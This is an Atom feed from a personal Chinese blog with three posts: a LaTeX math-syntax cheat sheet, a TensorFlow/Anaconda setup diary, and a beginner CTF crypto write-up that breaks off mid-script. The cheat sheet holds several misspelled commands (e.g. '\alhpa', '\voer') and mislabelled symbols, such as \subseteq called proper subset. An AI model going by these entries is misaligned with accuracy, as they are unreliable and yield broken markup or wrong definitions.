<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>mercer</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://mercer5.github.io/"/>
  <updated>2021-10-30T13:44:35.178Z</updated>
  <id>https://mercer5.github.io/</id>
  
  <author>
    <name>mercer</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>md数学公式语法</title>
    <link href="https://mercer5.github.io/2021/10/30/md%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F%E8%AF%AD%E6%B3%95/"/>
    <id>https://mercer5.github.io/2021/10/30/md%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F%E8%AF%AD%E6%B3%95/</id>
    <published>2021-10-30T13:38:41.000Z</published>
    <updated>2021-10-30T13:44:35.178Z</updated>
    
    <content type="html"><![CDATA[<h1 id="md数学公式语法"><a href="#md数学公式语法" class="headerlink" title="md数学公式语法"></a>md数学公式语法</h1><h2 id="行内与独行"><a href="#行内与独行" class="headerlink" title="行内与独行"></a>行内与独行</h2><ol><li><p><strong>行内公式</strong>：将公式插入到本行内，符号：<code>$公式内容$</code>，如：$xyz$</p></li><li><p><strong>独行公式</strong>：将公式插入到新的一行内，并且居中，符号：<code>$$公式内容$$</code>，</p><p>输入两个<code>$</code>+回车,就可以自动生成一个数学公式块</p><p>如：<br>$$<br>asdf<br>$$</p></li></ol><h2 id="上标、下标与组合"><a href="#上标、下标与组合" class="headerlink" title="上标、下标与组合"></a>上标、下标与组合</h2><ol><li>上标符号，符号：<code>^</code>，如：$x^4$</li><li>下标符号，符号：<code>_</code>，如：$x_1$</li><li>组合符号，符号：<code>{}</code>，如：${16}<em>{8}O{2+}</em>{2}$</li></ol><h2 id="汉字、字体与格式"><a href="#汉字、字体与格式" class="headerlink" title="汉字、字体与格式"></a>汉字、字体与格式</h2><ol><li>汉字形式，符号：<code>\mbox{}</code>，如：$V_{\mbox{初始}}$</li><li>字体控制，符号：<code>\displaystyle</code>，如：$\displaystyle \frac{x+y}{y+z}$</li><li>下划线符号，符号：<code>\underline</code>，如：$\underline{x+y}$</li><li>标签，符号<code>\tag{数字}</code>，如：$\tag{11}$</li><li>上大括号，符号：<code>\overbrace{算式}</code>，如：$\overbrace{a+b+c+d}^{2.0}$</li><li>下大括号，符号：<code>\underbrace{算式}</code>，如：$a+\underbrace{b+c}_{1.0}+d$</li><li>上位符号，符号：<code>\stacrel{上位符号}{基位符号}</code>，如：$\vec{x}\stackrel{\mathrm{def}}{=}{x_1,\dots,x_n}$</li></ol><h2 id="占位符"><a href="#占位符" class="headerlink" title="占位符"></a>占位符</h2><ol><li>两个quad空格，符号：<code>\qquad</code>，如：$x \qquad y$</li><li>quad空格，符号：<code>\quad</code>，如：$x \quad y$</li><li>大空格，符号<code>\</code>，如：$x \  y$</li><li>中空格，符号<code>\:</code>，如：$x:y$</li><li>小空格，符号<code>\,</code>，如：$x , y$</li><li>没有空格，符号``，如：$xy$</li><li>紧贴，符号<code>\!</code>，如：$x ! y$</li></ol><h2 id="定界符与组合"><a href="#定界符与组合" class="headerlink" title="定界符与组合"></a>定界符与组合</h2><ol><li>括号，符号：<code>（）\big(\big) \Big(\Big) \bigg(\bigg) \Bigg(\Bigg)</code>，如：$（）\big(\big) \Big(\Big) \bigg(\bigg) \Bigg(\Bigg)$</li><li>中括号，符号：<code>[]</code>，如：$[x+y]$</li><li>大括号，符号：<code>\{ \}</code>，如：${x+y}$</li><li>自适应括号，符号：<code>\left \right</code>，如：$\left(x\right)$，$\left(x{yz}\right)$</li><li>组合公式，符号：<code>{上位公式 \choose 下位公式}</code>，如：${n+1 \choose k}={n \choose k}+{n \choose k-1}$</li><li>组合公式，符号：<code>{上位公式 \atop 下位公式}</code>，如：$\sum_{k_0,k_1,\ldots&gt;0 \atop k_0+k_1+\cdots=n}A_{k_0}A_{k_1}\cdots$</li></ol><h2 id="四则运算"><a href="#四则运算" class="headerlink" title="四则运算"></a>四则运算</h2><ol><li>加法运算，符号：<code>+</code>，如：$x+y=z$</li><li>减法运算，符号：<code>-</code>，如：$x-y=z$</li><li>加减运算，符号：<code>\pm</code>，如：$x \pm y=z$</li><li>减甲运算，符号：<code>\mp</code>，如：$x \mp y=z$</li><li>乘法运算，符号：<code>\times</code>，如：$x \times y=z$</li><li>点乘运算，符号：<code>\cdot</code>，如：$x \cdot y=z$</li><li>星乘运算，符号：<code>\ast</code>，如：$x \ast y=z$</li><li>除法运算，符号：<code>\div</code>，如：$x \div y=z$</li><li>斜法运算，符号：<code>/</code>，如：$x/y=z$</li><li>分式表示，符号：<code>\frac{分子}{分母}</code>，如：$\frac{x+y}{y+z}$</li><li>分式表示，符号：<code>{分子} \voer {分母}</code>，如：${x+y} \over {y+z}$</li><li>绝对值表示，符号：<code>||</code>，如：$|x+y|$</li></ol><h2 id="高级运算"><a href="#高级运算" class="headerlink" title="高级运算"></a>高级运算</h2><ol><li><p>平均数运算，符号：<code>\overline{算式}</code>，如：$\overline{xyz}$</p></li><li><p>开二次方运算，符号：<code>\sqrt</code>，如：$\sqrt x$</p></li><li><p>开方运算，符号：<code>\sqrt[开方数]{被开方数}</code>，如：$\sqrt[3]{x+y}$</p></li><li><p>克罗内克积, 符号: <code>\bigotimes</code> , 如: $\bigotimes$</p></li><li><p>异或,符号: <code>\bigoplus</code>, 如: $\bigoplus$</p></li><li><p>对数运算，符号：<code>\log</code>，如：$\log(x)$</p></li><li><p>极限运算，符号：<code>\lim</code>，如：$\lim^{x \to \infty}_{y \to 0}{\frac{x}{y}}$</p></li><li><p>极限运算，符号：<code>\displaystyle \lim</code>，如：$\displaystyle \lim^{x \to \infty}_{y \to 0}{\frac{x}{y}}$</p></li><li><p>求和运算，符号：<code>\sum</code>，如：$\sum^{x \to \infty}_{y \to 0}{\frac{x}{y}}$</p></li><li><p>求和运算，符号：<code>\displaystyle \sum</code>，如：$\displaystyle \sum^{x \to \infty}_{y \to 0}{\frac{x}{y}}$</p></li><li><p>积分运算，符号：<code>\int</code>，如：$\int^{\infty}_{0}{xdx}$</p></li><li><p>积分运算，符号：<code>\displaystyle \int</code>，如：$\displaystyle \int^{\infty}_{0}{xdx}$</p></li><li><p>微分运算，符号：<code>\partial</code>，如：$\frac{\partial x}{\partial y}$</p></li><li><p>矩阵表示，符号：<code>\begin{matrix} \end{matrix}</code>，如：$\left[ \begin{matrix} 1 &amp;2 &amp;\cdots &amp;4 \5 &amp;6 &amp;\cdots &amp;8\ \vdots &amp;\vdots &amp;\ddots &amp;\vdots \13 &amp;14 &amp;\cdots &amp;16\end{matrix} \right]$</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$$</span><br><span class="line">\begin&#123;matrix&#125;</span><br><span class="line"><span class="number">1</span> &amp; <span class="number">2</span> &amp; <span class="number">3</span>\\</span><br><span class="line"><span class="number">4</span> &amp; <span class="number">5</span> &amp; <span class="number">6</span>\\</span><br><span class="line">\end&#123;matrix&#125;</span><br><span class="line">$$</span><br></pre></td></tr></table></figure><p>$$<br>\begin{matrix}<br>1 &amp; 2 &amp; 3\<br>4 &amp; 5 &amp; 6\<br>\end{matrix}<br>$$</p></li></ol><h2 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h2><ol><li>等于运算，符号：<code>=</code>，如：$x+y=z$</li><li>大于运算，符号：<code>&gt;</code>，如：$x+y&gt;z$</li><li>小于运算，符号：<code>&lt;</code>，如：$x+y&lt;z$</li><li>大于等于运算，符号：<code>\geq</code>，如：$x+y \geq z$</li><li>小于等于运算，符号：<code>\leq</code>，如：$x+y \leq z$</li><li>不等于运算，符号：<code>\neq</code>，如：$x+y \neq z$</li><li>不大于等于运算，符号：<code>\ngeq</code>，如：$x+y \ngeq z$</li><li>不大于等于运算，符号：<code>\not\geq</code>，如：$x+y \not\geq z$</li><li>不小于等于运算，符号：<code>\nleq</code>，如：$x+y \nleq z$</li><li>不小于等于运算，符号：<code>\not\leq</code>，如：$x+y \not\leq z$</li><li>约等于运算，符号：<code>\approx</code>，如：$x+y \approx z$</li><li>恒定等于运算，符号：<code>\equiv</code>，如：$x+y \equiv z$</li></ol><h2 id="集合运算"><a href="#集合运算" class="headerlink" title="集合运算"></a>集合运算</h2><ol><li>属于运算，符号：<code>\in</code>，如：$x \in y$</li><li>不属于运算，符号：<code>\notin</code>，如：$x \notin y$</li><li>不属于运算，符号：<code>\not\in</code>，如：$x \not\in y$</li><li>子集运算，符号：<code>\subset</code>，如：$x \subset y$</li><li>子集运算，符号：<code>\supset</code>，如：$x \supset y$</li><li>真子集运算，符号：<code>\subseteq</code>，如：$x \subseteq y$</li><li>非真子集运算，符号：<code>\subsetneq</code>，如：$x \subsetneq y$</li><li>真子集运算，符号：<code>\supseteq</code>，如：$x \supseteq y$</li><li>非真子集运算，符号：<code>\supsetneq</code>，如：$x \supsetneq y$</li><li>非子集运算，符号：<code>\not\subset</code>，如：$x \not\subset y$</li><li>非子集运算，符号：<code>\not\supset</code>，如：$x \not\supset y$</li><li>并集运算，符号：<code>\cup</code>，如：$x \cup y$</li><li>交集运算，符号：<code>\cap</code>，如：$x \cap y$</li><li>差集运算，符号：<code>\setminus</code>，如：$x \setminus y$</li><li>同或运算，符号：<code>\bigodot</code>，如：$x \bigodot y$</li><li>同与运算，符号：<code>\bigotimes</code>，如：$x \bigotimes y$</li><li>实数集合，符号：<code>\mathbb{R}</code>，如： $\mathbb{R}$</li><li>自然数集合，符号：<code>\mathbb{Z}</code>，如：$\mathbb{Z}$</li><li>空集，符号：<code>\emptyset</code>，如：$\emptyset$</li></ol><h2 id="数学符号"><a href="#数学符号" class="headerlink" title="数学符号"></a>数学符号</h2><ol><li>无穷，符号：<code>\infty</code>，如：$\infty$</li><li>虚数，符号：<code>\imath</code>，如：$\imath$</li><li>虚数，符号：<code>\jmath</code>，如：$\jmath$</li><li>数学符号，符号<code>\hat{a}</code>，如：$\hat{a}$</li><li>数学符号，符号<code>\check{a}</code>，如：$\check{a}$</li><li>数学符号，符号<code>\breve{a}</code>，如：$\breve{a}$</li><li>数学符号，符号<code>\tilde{a}</code>，如：$\tilde{a}$</li><li>数学符号，符号<code>\bar{a}</code>，如：$\bar{a}$</li><li>矢量符号，符号<code>\vec{a}</code>，如：$\vec{a}$</li><li>数学符号，符号<code>\acute{a}</code>，如：$\acute{a}$</li><li>数学符号，符号<code>\grave{a}</code>，如：$\grave{a}$</li><li>数学符号，符号<code>\mathring{a}</code>，如：$\mathring{a}$</li><li>一阶导数符号，符号<code>\dot{a}</code>，如：$\dot{a}$</li><li>二阶导数符号，符号<code>\ddot{a}</code>，如：$\ddot{a}$</li><li>上箭头，符号：<code>\uparrow</code>，如：$\uparrow$</li><li>上箭头，符号：<code>\Uparrow</code>，如：$\Uparrow$</li><li>下箭头，符号：<code>\downarrow</code>，如：$\downarrow$</li><li>下箭头，符号：<code>\Downarrow</code>，如：$\Downarrow$</li><li>左箭头，符号：<code>\leftarrow</code>，如：$\leftarrow$</li><li>左箭头，符号：<code>\Leftarrow</code>，如：$\Leftarrow$</li><li>右箭头，符号：<code>\rightarrow</code>，如：$\rightarrow$</li><li>右箭头，符号：<code>\Rightarrow</code>，如：$\Rightarrow$</li><li>底端对齐的省略号，符号：<code>\ldots</code>，如：$1,2,\ldots,n$</li><li>中线对齐的省略号，符号：<code>\cdots</code>，如：$x_1^2 + x_2^2 + \cdots + x_n^2$</li><li>竖直对齐的省略号，符号：<code>\vdots</code>，如：$\vdots$</li><li>斜对齐的省略号，符号：<code>\ddots</code>，如：$\ddots$</li><li>单波浪线,符号: <code>\sim</code> , 如: $\sim$</li></ol><h2 id="希腊字母"><a href="#希腊字母" class="headerlink" title="希腊字母"></a>希腊字母</h2><table><thead><tr><th>字母</th><th>实现</th><th>字母</th><th>实现</th></tr></thead><tbody><tr><td>A</td><td><code>A</code></td><td>α</td><td><code>\alhpa</code></td></tr><tr><td>B</td><td><code>B</code></td><td>β</td><td><code>\beta</code></td></tr><tr><td>Γ</td><td><code>\Gamma</code></td><td>γ</td><td><code>\gamma</code></td></tr><tr><td>Δ</td><td><code>\Delta</code></td><td>δ</td><td><code>\delta</code></td></tr><tr><td>E</td><td><code>E</code></td><td>ϵ</td><td><code>\epsilon</code></td></tr><tr><td>Z</td><td><code>Z</code></td><td>ζ</td><td><code>\zeta</code></td></tr><tr><td>H</td><td><code>H</code></td><td>η</td><td><code>\eta</code></td></tr><tr><td>Θ</td><td><code>\Theta</code></td><td>θ</td><td><code>\theta</code></td></tr><tr><td>I</td><td><code>I</code></td><td>ι</td><td><code>\iota</code></td></tr><tr><td>K</td><td><code>K</code></td><td>κ</td><td><code>\kappa</code></td></tr><tr><td>Λ</td><td><code>\Lambda</code></td><td>λ</td><td><code>\lambda</code></td></tr><tr><td>M</td><td><code>M</code></td><td>μ</td><td><code>\mu</code></td></tr><tr><td>N</td><td><code>N</code></td><td>ν</td><td><code>\nu</code></td></tr><tr><td>Ξ</td><td><code>\Xi</code></td><td>ξ</td><td><code>\xi</code></td></tr><tr><td>O</td><td><code>O</code></td><td>ο</td><td><code>\omicron</code></td></tr><tr><td>Π</td><td><code>\Pi</code></td><td>π</td><td><code>\pi</code></td></tr><tr><td>P</td><td><code>P</code></td><td>ρ</td><td><code>\rho</code></td></tr><tr><td>Σ</td><td><code>\Sigma</code></td><td>σ</td><td><code>\sigma</code></td></tr><tr><td>T</td><td><code>T</code></td><td>τ</td><td><code>\tau</code></td></tr><tr><td>Υ</td><td><code>\Upsilon</code></td><td>υ</td><td><code>\upsilon</code></td></tr><tr><td>Φ</td><td><code>\Phi</code></td><td>ϕ</td><td><code>\phi</code></td></tr><tr><td>X</td><td><code>X</code></td><td>χ</td><td><code>\chi</code></td></tr><tr><td>Ψ</td><td><code>\Psi</code></td><td>ψ</td><td><code>\psi</code></td></tr><tr><td>Ω</td><td><code>\v</code></td><td>ω</td><td><code>\omega</code></td></tr></tbody></table><h2 id="向量相关"><a href="#向量相关" class="headerlink" title="向量相关"></a>向量相关</h2><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$</span>\vec&#123;a&#125;<span class="symbol">$</span></span><br><span class="line"><span class="symbol">$</span>\vec&#123;AB&#125;<span class="symbol">$</span></span><br><span class="line"><span class="symbol">$</span>\vec&#123;ABC&#125;<span class="symbol">$</span></span><br><span class="line"><span class="symbol">$</span>\overrightarrow&#123;AB&#125;<span class="symbol">$</span></span><br><span class="line"><span class="symbol">$</span>\overleftarrow&#123;AB&#125;<span class="symbol">$</span></span><br></pre></td></tr></table></figure><p>$\vec{a}$<br>$\vec{AB}$<br>$\vec{ABC}$<br>$\overrightarrow{AB}$<br>$\overleftarrow{AB}$</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;md数学公式语法&quot;&gt;&lt;a href=&quot;#md数学公式语法&quot; class=&quot;headerlink&quot; title=&quot;md数学公式语法&quot;&gt;&lt;/a&gt;md数学公式语法&lt;/h1&gt;&lt;h2 id=&quot;行内与独行&quot;&gt;&lt;a href=&quot;#行内与独行&quot; class=&quot;headerlink
      
    
    </summary>
    
    
      <category term="杂七杂八" scheme="https://mercer5.github.io/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"/>
    
    
      <category term="基操" scheme="https://mercer5.github.io/tags/%E5%9F%BA%E6%93%8D/"/>
    
  </entry>
  
  <entry>
    <title>tensorflow安装</title>
    <link href="https://mercer5.github.io/2020/08/25/tensorflow%E5%AE%89%E8%A3%85/"/>
    <id>https://mercer5.github.io/2020/08/25/tensorflow%E5%AE%89%E8%A3%85/</id>
    <published>2020-08-25T06:24:56.000Z</published>
    <updated>2020-08-25T09:02:22.984Z</updated>
    
    <content type="html"><![CDATA[<h1 id="tensorflow安装"><a href="#tensorflow安装" class="headerlink" title="tensorflow安装"></a>tensorflow安装</h1><blockquote><p>想和小伙伴们搞一个机器学习相关的星火杯产品</p><p>所以从今天起要学习一下tensorflow啦</p><p>因为anaconda对数据处理的支持很大,所以就决定是他啦</p></blockquote><h2 id="虚拟环境相关-virtual-environment"><a href="#虚拟环境相关-virtual-environment" class="headerlink" title="虚拟环境相关(virtual environment)"></a>虚拟环境相关(virtual environment)</h2><ol><li><p>查看虚拟环境</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda env <span class="built_in">list</span></span><br></pre></td></tr></table></figure></li><li><p>创建虚拟环境</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda create -n <span class="keyword">new</span><span class="number">_</span>env</span><br></pre></td></tr></table></figure><p>创建对应python版本的虚拟环境</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda create -n <span class="keyword">new</span><span class="type">_env</span> python=<span class="number">3.5</span></span><br></pre></td></tr></table></figure></li><li><p>激活环境</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">activate</span> new_env</span><br></pre></td></tr></table></figure></li><li><p>移除环境</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda remove -n <span class="keyword">new</span><span class="type">_env</span> --all</span><br></pre></td></tr></table></figure></li><li><p>分享环境</p><p>如果你想把你当前的环境配置与别人分享，这样ta可以快速建立一个与你一模一样的环境（同一个版本的python及各种包）来共同开发/进行新的实验。一个分享环境的快速方法就是给ta一个你的环境的.yml文件。</p><p>输入下述代码,会在当前工作目录下生成一个environment.yml文件</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">conda</span> env ex<span class="keyword">port</span> &gt; environment.yml</span><br></pre></td></tr></table></figure><p>小伙伴拿到environment.yml文件后，将该文件放在工作目录下，可以通过以下命令从该文件创建环境</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">conda</span> <span class="selector-tag">env</span> <span class="selector-tag">create</span> <span class="selector-tag">-f</span> <span class="selector-tag">environment</span><span class="selector-class">.yml</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="前置措施"><a href="#前置措施" class="headerlink" title="前置措施"></a>前置措施</h2><p>为了避免在下载过程中,因网速太慢<del>(尤其是那该死的校园网)</del>,中断连接导致重下,还是换个源比较好</p><p>以下两个都是清华源</p><ol><li><p>换pip源</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 config <span class="keyword">set</span> <span class="keyword">global</span>.<span class="built_in">index</span>-url http<span class="variable">s:</span>//pypi.tuna.tsinghua.edu.<span class="keyword">cn</span>/simple</span><br></pre></td></tr></table></figure></li><li><p>换conda源</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 1. 设置</span></span><br><span class="line">conda config --add channels https:<span class="comment">//mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/</span></span><br><span class="line"><span class="meta"># 2. 生效</span></span><br><span class="line">conda config --<span class="keyword">set</span> show_channel_urls yes</span><br></pre></td></tr></table></figure></li></ol><h2 id="tensorflow安装步骤"><a href="#tensorflow安装步骤" class="headerlink" title="tensorflow安装步骤"></a>tensorflow安装步骤</h2><blockquote><p>参考: <a href="https://www.kesci.com/home/project/5e0e10332823a10036b24d67" target="_blank" rel="noopener">https://www.kesci.com/home/project/5e0e10332823a10036b24d67</a></p></blockquote><ol><li><p>打开 Anaconda Prompt 终端，建立一个 conda 计算环境</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda create -n tensorflow <span class="attribute">python</span>=3.5</span><br></pre></td></tr></table></figure></li><li><p>激活 tensorflow 环境</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">activate</span> tensorflow</span><br></pre></td></tr></table></figure><p>注意:只有出现以下划线部分,才算进入环境,base是默认环境</p><p>tensorflow是我们第一步安装的</p><p>如果没有,见下面 <strong>问题解决-&gt;环境无法激活</strong> 部分</p><p><img src="image-20200825112438072.png" alt="image-20200825112438072"></p></li><li><p>安装 tensorflow 模块</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 <span class="keyword">install</span> tensorflow</span><br></pre></td></tr></table></figure><p>如果出现timeout之类的错误,见下 *<em>问题解决-&gt;timeout *</em> 部分</p><p>上述命令下载的是最新版本</p><p>如果要下载指定版本的tensorflow,用以下语句</p><p><del>我没尝试过</del></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install tensorflow==<span class="number">1.2</span><span class="number">.1</span></span><br></pre></td></tr></table></figure></li><li><p>安装 keras 模块</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 <span class="keyword">install</span> keras</span><br></pre></td></tr></table></figure></li><li><p>将 tensorflow 嵌入到 jupyter</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">conda <span class="keyword">install</span> ipython</span><br><span class="line">conda <span class="keyword">install</span> jupyter</span><br><span class="line">ipython kernelspec <span class="keyword">install</span>-<span class="keyword">self</span> <span class="comment">--user</span></span><br><span class="line">jupyter kernelspec <span class="keyword">install</span>-<span class="keyword">self</span> <span class="comment">--user</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="tensorflow使用方法"><a href="#tensorflow使用方法" class="headerlink" title="tensorflow使用方法"></a>tensorflow使用方法</h2><ol><li><p>打开 <code>Anaconda Prompt</code> 终端</p></li><li><p>激活 tensorflow 环境</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">activate</span> tensorflow</span><br></pre></td></tr></table></figure></li><li><p>进入 tensorflow 环境之后,输入:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">jupyter notebook</span></span><br></pre></td></tr></table></figure></li><li><p>关闭 tensorflow 环境,输入:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">deactive tensorflow</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="检测tensorflow的安装"><a href="#检测tensorflow的安装" class="headerlink" title="检测tensorflow的安装"></a>检测tensorflow的安装</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tensorflow <span class="keyword">as</span> tf</span><br><span class="line">tf.compat.v1.disable_eager_execution()</span><br><span class="line">hello = tf.constant(<span class="string">"hello,tensorflow"</span>)</span><br><span class="line">sess= tf.compat.v1.Session()</span><br><span class="line">print(sess.run(hello))</span><br></pre></td></tr></table></figure><p><img src="image-20200825115632962.png" alt="image-20200825115632962"></p><h2 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h2><h3 id="环境无法激活"><a href="#环境无法激活" class="headerlink" title="环境无法激活"></a>环境无法激活</h3><blockquote><p>参考: <a href="https://www.jianshu.com/p/beccb78a7c7a" target="_blank" rel="noopener">https://www.jianshu.com/p/beccb78a7c7a</a></p></blockquote><ol><li><p>下载一个开源库</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda <span class="keyword">install</span> -n root -c pscondaenvs pscondaenvs</span><br></pre></td></tr></table></figure></li><li><p>更改Windows PowerShell配置</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Set</span>-ExecutionPolicy <span class="comment">RemoteSigned</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="timeout"><a href="#timeout" class="headerlink" title="timeout"></a>timeout</h3><ol><li><p>重新换源</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 config <span class="keyword">set</span> <span class="keyword">global</span>.<span class="built_in">index</span>-url http<span class="variable">s:</span>//pypi.tuna.tsinghua.edu.<span class="keyword">cn</span>/simple</span><br></pre></td></tr></table></figure><p>新装了新环境后好像pip源都是新的了</p><p>反正换源后速度正常</p></li><li><p>升级一下pip</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m pip <span class="keyword">install</span> <span class="comment">--upgrade pip</span></span><br></pre></td></tr></table></figure><p>换源后重新下,然后说我pip版本太低了,如有需求就用上述命令更新</p></li><li><p>然后发现我还是timeout了</p><p><del>所以我解决了啥啊?先放放,先放放</del></p></li><li><p>哦,好的,是校园网的问题</p><p>换热点就可以了……</p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;tensorflow安装&quot;&gt;&lt;a href=&quot;#tensorflow安装&quot; class=&quot;headerlink&quot; title=&quot;tensorflow安装&quot;&gt;&lt;/a&gt;tensorflow安装&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;想和小伙伴们搞一个机器学习相关的星
      
    
    </summary>
    
    
      <category term="python" scheme="https://mercer5.github.io/categories/python/"/>
    
    
      <category term="python" scheme="https://mercer5.github.io/tags/python/"/>
    
      <category term="tensorflow" scheme="https://mercer5.github.io/tags/tensorflow/"/>
    
  </entry>
  
  <entry>
    <title>xctf-crypto-新手练习区</title>
    <link href="https://mercer5.github.io/2020/08/25/xctf-crypto-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/"/>
    <id>https://mercer5.github.io/2020/08/25/xctf-crypto-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/</id>
    <published>2020-08-25T00:37:43.000Z</published>
    <updated>2020-08-25T00:41:31.184Z</updated>
    
    <content type="html"><![CDATA[<h1 id="xctf-crypto-新手练习区"><a href="#xctf-crypto-新手练习区" class="headerlink" title="xctf-crypto-新手练习区"></a>xctf-crypto-新手练习区</h1><h2 id="1-base64"><a href="#1-base64" class="headerlink" title="1. base64"></a>1. base64</h2><p>在线解密,或是自己写脚本都行</p><h2 id="2-Caesar"><a href="#2-Caesar" class="headerlink" title="2. Caesar"></a>2. Caesar</h2><p>同上</p><h2 id="3-Morse"><a href="#3-Morse" class="headerlink" title="3. Morse"></a>3. Morse</h2><p>同上</p><h2 id="4-混合编码"><a href="#4-混合编码" class="headerlink" title="4. 混合编码"></a>4. 混合编码</h2><ol><li>base64</li><li>html实体编码</li><li>base64</li><li>ascii</li></ol><h2 id="5-不仅仅是Morse"><a href="#5-不仅仅是Morse" class="headerlink" title="5. 不仅仅是Morse"></a>5. 不仅仅是Morse</h2><ol><li><p>morese解密</p><p>得到一串奇奇怪怪的东西</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MAY_BE_HAVE_ANOTHER_DECODEHHHHAAAAABAABBBAABBAAAAAAAABAABABAAAAAAABBABAAABBAAABBAABAAAABABAABAAABBABAAABAAABAABABBAABBBABAAABABABBAAABBABAAABAABAABAAAABBABBAABBAABAABAAABAABAABAABABAABBABAAAABBABAABBA</span><br></pre></td></tr></table></figure></li><li><p>后面的AB的长度为170</p><ul><li>5的倍数</li><li>只有两个字母</li><li>2^5^为32,可以很方便的表示26个字母</li><li>所以假设0-25,分别对应a-z</li></ul></li><li><p>尝试解密看看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#分割替换</span></span><br><span class="line">s=<span class="string">"AAAAABAABBBAABBAAAAAAAABAABABAAAAAAABBABAAABBAAABBAABAAAABABAABAAABBABAAABAAABAABABBAABBBABAAABABABBAAABBABAAABAABAABAAAABBABBAABBAABAABAAABAABAABAABABAABBABAAAABBABAABBA"</span></span><br><span class="line">s=s.replace(<span class="string">"A"</span>,<span class="string">"0"</span>)</span><br><span class="line">s=s.replace(<span class="string">"B"</span>,<span class="string">"1"</span>)</span><br><span class="line">lst=[]</span><br><span class="line"><span class="keyword">while</span>(s):</span><br><span 